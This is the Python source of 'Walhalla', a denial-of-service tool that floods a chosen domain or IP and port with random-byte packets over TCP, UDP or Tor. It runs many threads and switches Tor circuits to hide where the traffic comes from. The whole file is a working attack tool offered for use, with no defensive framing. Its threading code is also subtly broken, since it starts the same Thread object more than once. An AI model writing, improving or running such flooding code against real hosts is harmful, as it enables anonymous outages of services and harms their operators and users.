# WALHALLA - TCP/UDP/TOR DDOS TOOL WRITTEN IN PYTHON
# Author: PiereLucas(Julian Huch)
# MIT License

# Dist Modules
import os
import sys
import time
import socket
from threading import Thread
from argparse import ArgumentParser
# Site Modules
from modules.tor_ip_switcher import switch_ip
from modules import socks
from modules.colorama import Fore

# Colors
GREEN = Fore.GREEN
RED = Fore.RED
CYAN = Fore.CYAN
RESET = Fore.RESET

class Dos():
    """
    Dos Class for the main dos functions
    """

    def size(self, buffer_size):
        """ Make bytes from the user given buffer size """

        size = os.urandom(min(65507, buffer_size))
        return size

    def tor_flood(self, ip, port, buffer_size):
        """ TCP flood over TOR. You need a running tor service on 'localhost' and default port (9050) """

        while True:
            try:
                data = self.size(buffer_size)
                with socks.socksocket() as sock:
                    sock.settimeout(1)
                    sock.set_proxy(proxy_type=socks.SOCKS5, addr="localhost", port=9050)
                    sock.connect((ip, port))
                    sock.send(data)
            except Exception:
                print(RED + "Error in TOR" + RESET)
                continue

    def tcp_flood(self, ip, port, buffer_size):
        """ TCP flood function """

        while True:
            try:
                data = self.size(buffer_size)
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                    sock.connect((ip, port))
                    sock.send(data)
            except Exception:
                print(RED + "Error in TCP" + RESET)
                continue

    def udp_flood(self, ip, port, buffer_size):
        """ UDP flood function """

        while True:
            try:
                data = self.size(buffer_size)
                with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                    sock.sendto(data, (ip, port))
            except Exception:
                print(RED + "Error in UDP" + RESET)
                continue

class Controller(Dos):
    """
    Controller Class to serve the right Arguments to Dos Class
    """

    def __init__(self):

        # Time
        self.lt = time.localtime()
        self.time_hm = time.strftime("%H:%M")

        # Banner
        self.version = "v1.3"
        self.banner_txt = time.strftime("""
                         _       __      ____          ____     
                        | |     / /___ _/ / /_  ____ _/ / /___ _
                        | | /| / / __ `/ / __ \/ __ `/ / / __ `/
                        | |/ |/ / /_/ / / / / / /_/ / / / /_/ / 
                        |__/|__/\__,_/_/_/ /_/\__,_/_/_/\__,_/  
                                         [-V-]
                         » A TCP/UDP/TOR DDOS TOOL WRITTEN IN PYTHON «
              Coded by PiereLucas(Julian Huch) | https://github.com/pierelucas
                           Date: %d.%m.%y      | Time: %H:%M
                    
            """, self.lt)

        # Tor
        self.tor_pass = ""

    def arguments(self):
        """ Argument Parser for user input """

        parser = ArgumentParser(description=CYAN + self.banner_txt.replace("-V-", self.version) + RESET)
        parser.add_argument("-t", "--target", type=str, dest="target_addr", metavar="Target Address", help="[www.domain.com]")
        parser.add_argument("-p", "--port", type=int, dest="port", metavar="Port Number", help="[1-35535]")
        parser.add_argument("-m", "--mode", type=str, dest="dos_mode", metavar="DoS Mode", help="[udp|tcp|tor]")
        parser.add_argument("-a", "--amount", type=int, dest="amount", metavar="Number of Threads", help="N")
        parser.add_argument("-bs", "--buffer-size", type=int, dest="buffer_size", metavar="Package size in bytes", help="[1-65507]")
        args = parser.parse_args()
        _true = self.check_args(args)
        if _true:
            return args.target_addr, args.port, args.dos_mode, args.amount, args.buffer_size

    def check_args(self, args):
        """ Check from user given arguments """

        if args.target_addr and args.port and args.dos_mode and args.amount and args.buffer_size:
            try:
                if args.port > 35535: raise Exception
                elif args.buffer_size > 65507: raise Exception
                elif args.dos_mode == 'tor':
                    self.tor_pass = self.check_for_tor_pass()
                return True
            except Exception as ex:
                print("Use -h or --help for futher information :", ex)
                sys.exit(0)
        else:
            print("Use -h or --help for futher information")
            sys.exit(0)

    def check_for_tor_pass(self):
        """ Checking if the file 'tor_pass.txt' exists. When not ask prompt for TOR Control password """

        try:
            if os.path.isfile("tor_pass.txt"):
                with open("tor_pass.txt", 'rt') as f:
                    tor_pass = f.read()
                    print(CYAN + "TOR_PASS LOADED" + RESET)
                    if tor_pass == "":
                        print(RED + "tor_pass file is empty")
                        sys.exit(0)
            else:
                tor_pass = str(input("Tor Control Password » "))
                with open("tor_pass.txt", 'wt') as f:
                    f.write(tor_pass)
        except PermissionError as ex:
            print(RED + "No read/write permission :", ex)
            sys.exit(0)
        else:
            return tor_pass

    def get_fqdm(self, target_addr):
        """ Get Fully qualified domain name from the www.domain.com form"""

        try:
            target_ip = socket.gethostbyname(target_addr)
            return target_ip
        except socket.gaierror as ex:
            print("Please define target in IP or [www.domain.com] format :", ex)
            sys.exit(0)

    def threads(self, amount, dos_mode, target_ip, port, buffer_size):
        """ Threading function to give arguments to dos class and start multiple threads """

        if dos_mode == 'tcp':
            self.dos = lambda t, p, b: self.tcp_flood(target_ip, port, buffer_size)
        elif dos_mode == 'udp':
            self.dos = lambda t, p, b: self.udp_flood(target_ip, port, buffer_size)
        elif dos_mode == 'tor':
            self.dos = lambda t, p, b: self.tor_flood(target_ip, port, buffer_size)
            switch_ip_true = switch_ip(tor_pass=self.tor_pass)
            if switch_ip_true: print(CYAN + "NEW TOR CIRCUIT LOADED" + RESET)
            else:
                print(RED + "Error in switch_ip" + RESET)
                sys.exit(0)
        try:
            thread = Thread(target=self.dos, args=(target_ip, port, buffer_size))
            for nr in range(int(amount)):
                print(GREEN + "Starting Thread nr [{}] to target [{}]:[{}]".format(thread, target_ip, port) + RESET)
                thread.start()
                print(GREEN + "MODE: [{}] THREAD: [{}] » Sucessfully started and sending packets with size [{}] bytes to target [{}]:[{}] \n\n" \
                      .format(dos_mode, thread, buffer_size, target_ip, port) + RESET)
            print(GREEN + "Sending packets ...\n\nPRESS CTRL+C TO QUIT" + RESET)
            while True:     # keep alive to still handle exceptions
                time.sleep(1)
        except Exception as ex:
            print(RED + "Error in Threading [{}] :", ex)
            sys.exit(0)
        except KeyboardInterrupt as ex:
            print(RED + "YOU PRESSED CTRL + C :", ex)
            sys.exit(0)

    def run(self):
        """ Run function to start everything """

        target_addr, port, dos_mode, amount, buffer_size = self.arguments()
        target_ip = self.get_fqdm(target_addr)
        self.threads(amount, dos_mode, target_ip, port, buffer_size)

if __name__ == "__main__":
    cc = Controller()
    cc.run()
